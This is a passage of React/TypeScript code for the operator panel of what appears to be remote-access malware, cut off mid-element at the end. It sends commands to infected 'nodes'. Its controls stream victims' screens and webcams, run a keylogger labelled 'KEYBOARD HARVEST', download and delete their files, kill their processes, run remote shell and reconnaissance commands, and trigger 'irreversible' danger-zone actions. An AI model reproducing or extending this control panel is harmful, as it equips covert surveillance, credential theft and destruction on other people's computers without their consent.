          borderRadius: '6px', width: '100%',
        }}
      >
        {React.createElement(cmd.icon || Terminal, { size: 14, style: { flexShrink: 0 } })}
        <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cmd.label}</span>
      </motion.button>
    );
  };

  const renderControlPage = () => (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem', padding: '0.5rem' }}>
      {controlGroups.map(group => (
        <div key={group.title}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '0.8rem' }}>
            {React.createElement(group.icon, { size: 16, color: group.color })}
            <span style={{ color: group.color, fontWeight: '800', fontSize: '0.7rem', letterSpacing: '2px', fontFamily: 'monospace' }}>{group.title}</span>
            <div style={{ flex: 1, height: '1px', background: `${group.color}22` }} />
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: '0.4rem' }}>
            {group.cmds.map(renderModuleButton)}
          </div>
        </div>
      ))}
    </div>
  );

  const renderIntelPage = () => (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', padding: '0.5rem', height: '100%' }}>
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
        <div className="card" style={{ padding: '1rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
            <span style={{ fontSize: '0.65rem', fontWeight: '800', color: accentColor }}>SCREEN</span>
            <div style={{ display: 'flex', gap: '0.3rem' }}>
              <button onClick={() => sendCommand('take_screenshot')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem', borderColor: accentColor }}>SNAP</button>
              <button onClick={() => sendCommand('start_screen_stream')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>STREAM</button>
              <button onClick={() => sendCommand('stop_screen_stream')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>STOP</button>
            </div>
          </div>
          <div style={{ aspectRatio: '16/9', background: '#000', borderRadius: '4px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '1px solid #111' }}>
            {lastSct ? <img src={lastSct} style={{ width: '100%', height: '100%', objectFit: 'contain' }} alt="" /> : <Camera size={40} opacity={0.1} />}
          </div>
        </div>
        <div className="card" style={{ padding: '1rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
            <span style={{ fontSize: '0.65rem', fontWeight: '800', color: accentColor }}>WEBCAM</span>
            <div style={{ display: 'flex', gap: '0.3rem' }}>
              <button onClick={() => sendCommand('start_webcam_stream')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem', borderColor: accentColor }}>SNAP</button>
              <button onClick={() => sendCommand('stop_webcam_stream')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>STOP</button>
            </div>
          </div>
          <div style={{ aspectRatio: '4/3', background: '#000', borderRadius: '4px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '1px solid #111' }}>
            {lastCam ? <img src={lastCam} style={{ width: '100%', height: '100%', objectFit: 'contain' }} alt="" /> : <Camera size={40} opacity={0.1} />}
          </div>
        </div>
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
        <div className="card" style={{ padding: '1rem', flex: 1, border: `1px solid ${accentColor}33`, display: 'flex', flexDirection: 'column' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
            <span style={{ fontSize: '0.65rem', fontWeight: '800', color: accentColor }}>KEYBOARD HARVEST</span>
            <div style={{ display: 'flex', gap: '0.3rem' }}>
              <button onClick={() => sendCommand('start_keylogger')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem', borderColor: dangerColor }}>ON</button>
              <button onClick={() => sendCommand('stop_keylogger')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>OFF</button>
              <button onClick={() => sendCommand('clear_keylogs')} className="btn" style={{ fontSize: '0.5rem', padding: '0.3rem 0.6rem' }}>CLR</button>
            </div>
          </div>
          <div style={{ flex: 1, background: '#050505', border: '1px solid #111', borderRadius: '4px', padding: '0.8rem', fontFamily: 'monospace', fontSize: '0.7rem', color: accentColor, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
            {keylogData || 'LISTENING...'}
          </div>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(120px, 1fr))', gap: '0.4rem' }}>
          {intelCmds.map(renderModuleButton)}
        </div>
      </div>
    </div>
  );

  const renderFilesPage = () => {
    const currentPath = fmMode === 'server' ? fmPath : clientFmPath;
    const currentItems = fmMode === 'server' ? fmItems : clientFmItems;
    return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem', padding: '0.5rem', height: '100%' }}>
      <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center', flexWrap: 'wrap' }}>
        <button onClick={() => { loadDrives(); }} className="btn" style={{ padding: '0.5rem', fontSize: '0.6rem', borderColor: accentColor }}><Home size={14} /></button>
        <button onClick={() => { const p = currentPath.split('\\').slice(0, -1).join('\\'); if (p) loadDir(p); }} className="btn" style={{ padding: '0.5rem', fontSize: '0.6rem' }}><ArrowUp size={14} /></button>
        <div style={{ flex: 1, display: 'flex', gap: '0.3rem', overflowX: 'auto', padding: '0.3rem' }}>
          {currentPath.split('\\').filter(Boolean).map((part, i, arr) => (
            <React.Fragment key={i}>
              <button onClick={() => { const p = arr.slice(0, i + 1).join('\\') + '\\'; loadDir(p); }}
                style={{ background: 'none', border: 'none', color: i === arr.length - 1 ? accentColor : '#555', cursor: 'pointer', fontSize: '0.6rem', fontFamily: 'monospace', whiteSpace: 'nowrap' }}>
                {part.length > 14 ? part.slice(0, 14) + '..' : part}
              </button>
              {i < arr.length - 1 && <span style={{ color: '#333', fontSize: '0.5rem' }}>/</span>}
            </React.Fragment>
          ))}
        </div>
        <div style={{ display: 'flex', gap: '0.3rem' }}>
          <button onClick={() => setFmMode(fmMode === 'server' ? 'client' : 'server')} className="btn"
            style={{ padding: '0.4rem 0.6rem', fontSize: '0.5rem', borderColor: fmMode === 'client' ? accentColor : '#333', color: fmMode === 'client' ? accentColor : '#666' }}>
            {fmMode === 'server' ? 'SERVER' : 'CLIENT'}
          </button>
          <button onClick={() => setFmView('grid')} className="btn" style={{ padding: '0.5rem', fontSize: '0.5rem', borderColor: fmView === 'grid' ? accentColor : 'transparent' }}><Grid3X3 size={12} /></button>
          <button onClick={() => setFmView('list')} className="btn" style={{ padding: '0.5rem', fontSize: '0.5rem', borderColor: fmView === 'list' ? accentColor : 'transparent' }}><ListIcon size={12} /></button>
          <button onClick={() => { if (fmSearch) { if (fmMode === 'client') sendCommand('search_files', { root: currentPath, pattern: fmSearch }); else fetchFM(`/fm/search?root=${encodeURIComponent(currentPath)}&pattern=${encodeURIComponent(fmSearch)}`).then(d => d?.results && setFmItems(d.results)); } }}
            className="btn" style={{ padding: '0.5rem', fontSize: '0.5rem', borderColor: accentColor }}><Search size={12} /></button>
        </div>
        <input value={fmSearch} onChange={e => setFmSearch(e.target.value)} onKeyDown={e => {
          if (e.key === 'Enter' && fmSearch) {
            if (fmMode === 'client') sendCommand('search_files', { root: currentPath, pattern: fmSearch });
            else fetchFM(`/fm/search?root=${encodeURIComponent(currentPath)}&pattern=${encodeURIComponent(fmSearch)}`).then(d => d?.results && setFmItems(d.results));
          }
        }}
          placeholder="SEARCH..." style={{ width: '100px', background: '#000', border: '1px solid #222', padding: '0.4rem 0.6rem', fontSize: '0.6rem', color: '#fff' }} />
      </div>

      <div style={{ display: 'flex', gap: '0.8rem', flex: 1, overflow: 'hidden' }}>
        {fmMode === 'server' && (
        <div style={{ width: '160px', background: '#050505', border: '1px solid #111', borderRadius: '6px', padding: '0.5rem', overflowY: 'auto', flexShrink: 0 }}>
          <div style={{ fontSize: '0.55rem', color: '#555', marginBottom: '0.5rem', fontWeight: '800', letterSpacing: '1px' }}>DRIVES</div>
          {fmDrives.map((d: any) => (
            <div key={d.mount || d.device} onClick={() => { const p = d.mount || `${d.device}\\`; loadDir(p); }}
              style={{ padding: '0.6rem', border: '1px solid #111', marginBottom: '0.4rem', cursor: 'pointer', borderRadius: '4px', background: currentPath.startsWith(d.mount || d.device) ? `${accentColor}15` : 'transparent' }}>
              <div style={{ fontSize: '0.65rem', fontWeight: '800', color: '#fff' }}>{d.mount || d.device}</div>
              <div style={{ fontSize: '0.5rem', color: '#666' }}>{d.total ? `${(d.used / d.total * 100).toFixed(0)}%` : '--'}</div>
              {d.total && (
                <div style={{ height: '3px', background: '#111', borderRadius: '2px', marginTop: '4px' }}>
                  <div style={{ height: '100%', width: `${(d.used / d.total * 100).toFixed(0)}%`, background: (d.used / d.total) > 0.85 ? dangerColor : accentColor, borderRadius: '2px' }} />
                </div>
              )}
            </div>
          ))}
        </div>
        )}

        <div style={{ flex: 1, background: '#050505', border: '1px solid #111', borderRadius: '6px', overflow: 'hidden', overflowY: 'auto' }}>
          {currentItems.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '3rem', opacity: 0.15 }}>
              <Folder size={48} />
              <div style={{ marginTop: '0.8rem', fontSize: '0.65rem' }}>EMPTY DIRECTORY</div>
              <div style={{ fontSize: '0.5rem', color: '#555', marginTop: '0.3rem' }}>{fmMode === 'client' ? 'Send list_dir command to populate' : 'Navigate to a directory'}</div>
            </div>
          ) : fmView === 'grid' ? (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(110px, 1fr))', gap: '0.4rem', padding: '0.8rem' }}>
              {currentItems.map((item, i) => {
                const Icon = fileIcon(item.name, item.is_dir);
                return (
                  <motion.div key={i} whileHover={{ scale: 1.03 }} whileTap={{ scale: 0.97 }}
                    onClick={() => { if (item.is_dir) { loadDir(item.path); } else if (fmMode === 'client') { sendCommand('download_file', { path: item.path }); } }}
                    style={{ padding: '1rem 0.6rem', border: '1px solid #111', borderRadius: '6px', cursor: 'pointer', textAlign: 'center', background: 'rgba(255,255,255,0.02)' }}>
                    {React.createElement(Icon, { size: 28, color: item.is_dir ? accentColor : '#555', style: { marginBottom: '0.5rem' } })}
                    <div style={{ fontSize: '0.55rem', color: '#ccc', wordBreak: 'break-all', lineHeight: '1.2' }}>{item.name.length > 18 ? item.name.slice(0, 16) + '..' : item.name}</div>
                    {item.size != null && <div style={{ fontSize: '0.45rem', color: '#555', marginTop: '4px' }}>{(item.size / 1024).toFixed(1)} KB</div>}
                  </motion.div>
                );
              })}
            </div>
          ) : (
            <table style={{ width: '100%', fontSize: '0.6rem', borderCollapse: 'collapse' }}>
              <thead style={{ background: '#0a0a0a', color: '#555' }}>
                <tr><th style={{ padding: '8px 12px', textAlign: 'left', fontWeight: '800' }}>NAME</th><th style={{ padding: '8px', textAlign: 'right', fontWeight: '800' }}>SIZE</th><th style={{ padding: '8px' }}>ACTION</th></tr>
              </thead>
              <tbody>
                {currentItems.map((item, i) => (
                  <tr key={i} style={{ borderBottom: '1px solid #0a0a0a' }}>
                    <td style={{ padding: '6px 12px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        {React.createElement(fileIcon(item.name, item.is_dir), { size: 14, color: item.is_dir ? accentColor : '#666' })}
                        <span style={{ cursor: item.is_dir ? 'pointer' : 'default', color: item.is_dir ? accentColor : '#ccc' }}
                          onClick={() => { if (item.is_dir) loadDir(item.path); }}>
                          {item.name}
                        </span>
                      </div>
                    </td>
                    <td style={{ padding: '6px 8px', textAlign: 'right', color: '#666' }}>{item.is_dir ? '--' : item.size != null ? `${(item.size / 1024).toFixed(1)} KB` : '--'}</td>
                    <td style={{ padding: '6px 8px', textAlign: 'center' }}>
                      {!item.is_dir && <button onClick={() => sendCommand('download_file', { path: item.path })} className="btn" style={{ padding: '0.2rem 0.5rem', fontSize: '0.5rem' }}><Download size={10} /></button>}
                      <button onClick={() => sendCommand('delete_file', { path: item.path })} className="btn" style={{ padding: '0.2rem 0.5rem', fontSize: '0.5rem', color: dangerColor }}><Trash2 size={10} /></button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );};

  const renderProcessesPage = () => (
    <div style={{ padding: '0.5rem', height: '100%', display: 'flex', flexDirection: 'column' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
        <span style={{ fontSize: '0.7rem', fontWeight: '800', color: accentColor }}>PROCESSES ({processes.length})</span>
        <button onClick={() => sendCommand('get_processes')} className="btn" style={{ fontSize: '0.55rem', padding: '0.3rem 0.8rem', borderColor: accentColor }}><RefreshCcw size={12} /> REFRESH</button>
      </div>
      <div style={{ flex: 1, background: '#050505', border: '1px solid #111', borderRadius: '6px', overflow: 'auto' }}>
        <table style={{ width: '100%', fontSize: '0.6rem', borderCollapse: 'collapse' }}>
          <thead style={{ background: '#0a0a0a', color: '#555', position: 'sticky', top: 0 }}>
            <tr><th style={{ padding: '8px 12px', textAlign: 'left' }}>PID</th><th style={{ textAlign: 'left' }}>NAME</th><th style={{ textAlign: 'left' }}>USER</th><th style={{ padding: '8px', textAlign: 'center' }}>KILL</th></tr>
          </thead>
          <tbody>
            {processes.map(p => (
              <tr key={p.pid} style={{ borderBottom: '1px solid #0a0a0a' }}>
                <td style={{ padding: '6px 12px', color: '#888', fontFamily: 'monospace' }}>{p.pid}</td>
                <td style={{ padding: '6px 12px', fontWeight: 'bold' }}>{p.name}</td>
                <td style={{ padding: '6px 12px', color: '#666' }}>{p.username || '--'}</td>
                <td style={{ padding: '6px 8px', textAlign: 'center' }}>
                  <button onClick={() => sendCommand('kill_process', { pid: p.pid })} className="btn" style={{ padding: '0.2rem 0.5rem', fontSize: '0.5rem', color: dangerColor }}><Trash2 size={10} /></button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(120px, 1fr))', gap: '0.4rem', marginTop: '1rem' }}>
        {processCmds.map(renderModuleButton)}
      </div>
    </div>
  );

  const renderHarvestPage = () => {
    const groups = [...new Set(harvestCmds.map(c => c.group))];
    return (
      <div style={{ padding: '0.5rem', overflowY: 'auto', height: '100%' }}>
        {groups.map(group => (
          <div key={group} style={{ marginBottom: '1.5rem' }}>
            <div style={{ fontSize: '0.65rem', fontWeight: '800', color: '#fbbf24', letterSpacing: '2px', marginBottom: '0.6rem', fontFamily: 'monospace' }}>{group}</div>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(150px, 1fr))', gap: '0.4rem' }}>
              {harvestCmds.filter(c => c.group === group).map(c => (
                <motion.button key={c.label} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
                  onClick={() => sendCommand(c.type)} className="btn"
                  style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', padding: '0.65rem 0.8rem', fontSize: '0.55rem', border: '1px solid #fbbf2422', color: '#fbbf24', background: '#fbbf2408', borderRadius: '6px', fontFamily: 'monospace', fontWeight: '700' }}>
                  {React.createElement(c.icon, { size: 14 })}
                  <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{c.label}</span>
                </motion.button>
              ))}
            </div>
          </div>
        ))}
      </div>
    );
  };

  const renderPranksPage = () => (
    <div style={{ padding: '0.5rem', overflowY: 'auto', height: '100%' }}>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: '0.4rem' }}>
        {prankCmds.map(renderModuleButton)}
      </div>
    </div>
  );

  const renderDefensePage = () => (
    <div style={{ padding: '0.5rem', overflowY: 'auto', height: '100%' }}>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: '0.4rem' }}>
        {defenseCmds.map(renderModuleButton)}
      </div>
    </div>
  );

  const renderMediaPage = () => (
    <div style={{ padding: '0.5rem', overflowY: 'auto', height: '100%' }}>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: '0.4rem' }}>
        {mediaCmds.map(renderModuleButton)}
      </div>
    </div>
  );

  const renderDangerPage = () => (
    <div style={{ padding: '0.5rem', overflowY: 'auto', height: '100%' }}>
      <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1rem', fontSize: '0.7rem', color: dangerColor, fontFamily: 'monospace', fontWeight: '800', letterSpacing: '2px' }}>
        <AlertTriangle size={16} /> DANGER ZONE — IRREVERSIBLE ACTIONS
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: '0.4rem' }}>
        {dangerCmds.map(renderModuleButton)}
      </div>
    </div>
  );

  const renderTerminalPage = () => (
    <div style={{ padding: '0.5rem', height: '100%', display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
      <div style={{ display: 'flex', gap: '0.5rem' }}>
        <input value={inputValue} onChange={e => setInputValue(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && sendCommand('execute_command', { command: inputValue })}
          placeholder="> SHELL COMMAND..." style={{ flex: 1, background: '#000', border: `1px solid ${accentColor}33`, padding: '0.8rem 1rem', color: accentColor, fontFamily: 'monospace', fontSize: '0.75rem' }} />
        <button onClick={() => sendCommand('execute_command', { command: inputValue })} className="btn" style={{ borderColor: accentColor, fontSize: '0.6rem', padding: '0 1.5rem' }}>EXEC</button>
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(120px, 1fr))', gap: '0.4rem' }}>
        {[
          { label: 'WHOAMI', cmd: 'whoami' },
          { label: 'IPCONFIG', cmd: 'ipconfig /all' },
          { label: 'SYSTEMINFO', cmd: 'systeminfo' },
          { label: 'NET USER', cmd: 'net user' },
          { label: 'TASKLIST', cmd: 'tasklist' },
          { label: 'DIR C:\\', cmd: 'dir C:\\' },
          { label: 'NETSTAT -AN', cmd: 'netstat -an' },
          { label: 'ROUTE PRINT', cmd: 'route print' },
          { label: 'ARP -A', cmd: 'arp -a' },
          { label: 'POWERSHELL', cmd: 'powershell Get-Process' },
        ].map(c => (
          <motion.button key={c.label} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
            onClick={() => sendCommand('execute_command', { command: c.cmd })} className="btn"
            style={{ padding: '0.5rem', fontSize: '0.55rem', border: '1px solid rgba(255,255,255,0.05)', fontFamily: 'monospace' }}>
            {c.label}
          </motion.button>
        ))}
      </div>
      <div style={{ flex: 1, background: '#050505', border: '1px solid #111', borderRadius: '6px', padding: '0.8rem', fontFamily: 'monospace', fontSize: '0.6rem', color: '#888', overflowY: 'auto' }}>
        {logs.slice(0, 50).map(log => (
          <div key={log.id} style={{ marginBottom: '4px' }}>
            <span style={{ opacity: 0.3 }}>[{log.time}]</span>
            <span style={{ marginLeft: '8px', color: log.type === 'error' ? dangerColor : log.type === 'success' ? successColor : log.type === 'result' ? '#fff' : '#555' }}>{log.text}</span>
          </div>
        ))}
        <div ref={logsEndRef} />
      </div>
    </div>
  );

  const renderDashboard = () => (
    <div style={{ padding: '0.5rem', height: '100%', overflowY: 'auto' }}>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '1rem', marginBottom: '1.5rem' }}>
        <div className="card" style={{ padding: '1.5rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ fontSize: '0.5rem', color: '#555', letterSpacing: '2px', marginBottom: '0.5rem' }}>TOTAL NODES</div>
          <div style={{ fontSize: '2rem', fontWeight: '900', color: accentColor }}>{nodes.length}</div>
          <div style={{ fontSize: '0.55rem', color: '#444', marginTop: '0.3rem' }}>
            <span style={{ color: successColor }}>● {nodes.filter(n => n.status === 'Online').length} ONLINE</span>
          </div>
        </div>
        <div className="card" style={{ padding: '1.5rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ fontSize: '0.5rem', color: '#555', letterSpacing: '2px', marginBottom: '0.5rem' }}>UPLINK STATUS</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.8rem' }}>
            <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: wsConnected ? successColor : dangerColor, boxShadow: wsConnected ? `0 0 20px ${successColor}66` : `0 0 20px ${dangerColor}66` }} />
            <span style={{ fontSize: '1rem', fontWeight: '800', color: wsConnected ? successColor : dangerColor }}>{wsConnected ? 'SECURE' : 'OFFLINE'}</span>
          </div>
        </div>
        <div className="card" style={{ padding: '1.5rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ fontSize: '0.5rem', color: '#555', letterSpacing: '2px', marginBottom: '0.5rem' }}>SELECTED NODE</div>
          <div style={{ fontSize: '0.9rem', fontWeight: '800', color: '#fff' }}>{selectedNode?.name || 'NONE'}</div>
          <div style={{ fontSize: '0.5rem', color: '#555', marginTop: '0.3rem' }}>{selectedNode?.ip || '--'}</div>
        </div>
        <div className="card" style={{ padding: '1.5rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ fontSize: '0.5rem', color: '#555', letterSpacing: '2px', marginBottom: '0.5rem' }}>SERVER</div>
          <div style={{ fontSize: '0.55rem', color: '#888', wordBreak: 'break-all' }}>{hdexUrl.replace('https://', '').replace('wss://', '')}</div>
        </div>
      </div>

      <div style={{ display: 'flex', gap: '1rem', marginBottom: '1.5rem' }}>
        <div className="card" style={{ flex: 1, padding: '1rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ fontSize: '0.55rem', color: '#555', letterSpacing: '2px', marginBottom: '0.8rem' }}>QUICK ACTIONS</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(100px, 1fr))', gap: '0.4rem' }}>
            {controlGroups.slice(0, 1)[0]?.cmds.slice(0, 10).map(renderModuleButton)}
          </div>
        </div>
        <div className="card" style={{ flex: 1, padding: '1rem', border: `1px solid ${accentColor}33` }}>
          <div style={{ fontSize: '0.55rem', color: '#555', letterSpacing: '2px', marginBottom: '0.8rem' }}>INTEL PREVIEW</div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.8rem' }}>
            <div style={{ aspectRatio: '16/9', background: '#000', borderRadius: '4px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              {lastSct ? <img src={lastSct} style={{ width: '100%', height: '100%', objectFit: 'contain' }} alt="" /> : <Camera size={24} opacity={0.1} />}
            </div>
            <div style={{ aspectRatio: '4/3', background: '#000', borderRadius: '4px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              {lastCam ? <img src={lastCam} style={{ width: '100%', height: '100%', objectFit: 'contain' }} alt="" /> : <Camera size={24} opacity={0.1} />}
            </div>
          </div>
        </div>
      </div>

      <div className="card" style={{ padding: '1rem', border: `1px solid ${accentColor}33` }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.8rem' }}>
          <span style={{ fontSize: '0.55rem', color: '#555', letterSpacing: '2px' }}>ALL NODES</span>
          <span style={{ fontSize: '0.5rem', color: '#444' }}>{filteredNodes.length} FOUND</span>
        </div>
        {filteredNodes.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '2rem', opacity: 0.2 }}>
            <Monitor size={48} />
            <div style={{ marginTop: '1rem', fontSize: '0.7rem' }}>NO NODES FOUND</div>
          </div>
        ) : (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: '0.5rem' }}>
            {filteredNodes.map(node => (
              <motion.div key={node.id} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
                onClick={() => setSelectedNode(node)}
                style={{ padding: '1rem', border: selectedNode?.id === node.id ? `1px solid ${accentColor}` : '1px solid #111', borderRadius: '6px', cursor: 'pointer', background: selectedNode?.id === node.id ? `${accentColor}10` : 'rgba(255,255,255,0.02)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.4rem' }}>
                  <span style={{ fontWeight: '900', fontSize: '0.7rem' }}>{node.name || node.id.slice(0, 12)}</span>
                  <span style={{ fontSize: '0.5rem', color: node.status === 'Online' ? successColor : dangerColor }}>●</span>
                </div>
                <div style={{ fontSize: '0.5rem', color: '#555', fontFamily: 'monospace' }}>{node.ip || '--'} — {node.os?.toUpperCase()?.slice(0, 30) || '--'}</div>
              </motion.div>
            ))}
          </div>
        )}
      </div>
    </div>
  );

  const renderModuleContent = () => {
    switch (activeModule) {
      case 'DASHBOARD': return renderDashboard();
      case 'CONTROL': return renderControlPage();
      case 'INTEL': return renderIntelPage();
      case 'FILES': return renderFilesPage();
      case 'PROCESS': return renderProcessesPage();
      case 'HARVEST': return renderHarvestPage();
      case 'PRANKS': return renderPranksPage();
      case 'DEFENSE': return renderDefensePage();
      case 'MEDIA': return renderMediaPage();
      case 'DANGER': return renderDangerPage();
      case 'TERMINAL': return renderTerminalPage();
      default: return renderDashboard();
    }
  };

  return (
    <div style={{ height: '100vh', display: 'flex', flexDirection: 'column', background: '#000', overflow: 'hidden' }}>
      
      {/* INPUT MODAL */}
      <AnimatePresence>
        {inputModal && (
          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.92)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(10px)' }}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
              className="card" style={{ width: '480px', padding: '2.5rem', border: `1px solid ${accentColor}` }}>
              <h3 style={{ fontSize: '0.9rem', letterSpacing: '3px', marginBottom: '1.5rem', fontFamily: 'monospace', color: accentColor }}>{inputModal.label}</h3>
              <input autoFocus type="text" value={inputValue} onChange={e => setInputValue(e.target.value)}
                placeholder={inputModal.placeholder}
                style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #333', color: '#fff', fontSize: '0.85rem', fontFamily: 'monospace' }}
                onKeyDown={e => e.key === 'Enter' && submitCommandInput()} />
              <div style={{ display: 'flex', gap: '1rem', marginTop: '2rem' }}>
                <button onClick={submitCommandInput} className="btn" style={{ flex: 1, borderColor: accentColor, color: accentColor }}>SEND</button>
                <button onClick={() => setInputModal(null)} className="btn" style={{ flex: 1, background: '#111' }}>CANCEL</button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* MEDIA URL MODAL */}
      <AnimatePresence>
        {mediaModal && (
          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.92)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(10px)' }}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
              className="card" style={{ width: '520px', padding: '2rem', border: `1px solid ${accentColor}` }}>
              <h3 style={{ fontSize: '0.8rem', letterSpacing: '3px', marginBottom: '1.5rem', fontFamily: 'monospace', color: accentColor }}>SHOW MEDIA ON TARGET</h3>

              <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1.5rem' }}>
                {['image', 'video', 'audio'].map(t => (
                  <button key={t} onClick={() => setMediaType(t as any)}
                    style={{ flex: 1, padding: '0.6rem', background: mediaType === t ? accentColor : '#111', color: mediaType === t ? '#000' : '#888', border: 'none', borderRadius: '4px', cursor: 'pointer', textTransform: 'uppercase', fontSize: '0.6rem', letterSpacing: '2px', fontWeight: 'bold' }}>
                    {t}
                  </button>
                ))}
              </div>

              <input autoFocus type="text" value={mediaUrl} onChange={e => setMediaUrl(e.target.value)}
                placeholder="https://example.com/image.png"
                style={{ width: '100%', padding: '0.8rem', background: '#000', border: '1px solid #333', color: '#fff', fontSize: '0.75rem', fontFamily: 'monospace', marginBottom: '1rem' }} />

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
                {mediaType === 'image' && <>
                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>DURATION (sec)</label>
                    <input type="number" value={mediaDuration} onChange={e => setMediaDuration(Number(e.target.value))} min={1} max={300}
                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }} /></div>
                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>SCALE (%)</label>
                    <input type="number" value={mediaScale} onChange={e => setMediaScale(Number(e.target.value))} min={10} max={200}
                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }} /></div>
                </>}
                {mediaType === 'video' && <>
                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>FULLSCREEN</label>
                    <select value={mediaFullscreen ? 'yes' : 'no'} onChange={e => setMediaFullscreen(e.target.value === 'yes')}
                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }}>
                      <option value="yes">Yes</option><option value="no">No</option></select></div>
                </>}
                {mediaType === 'audio' && <>
                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>VOLUME (0-100)</label>
                    <input type="number" value={mediaVolume} onChange={e => setMediaVolume(Number(e.target.value))} min={0} max={100}
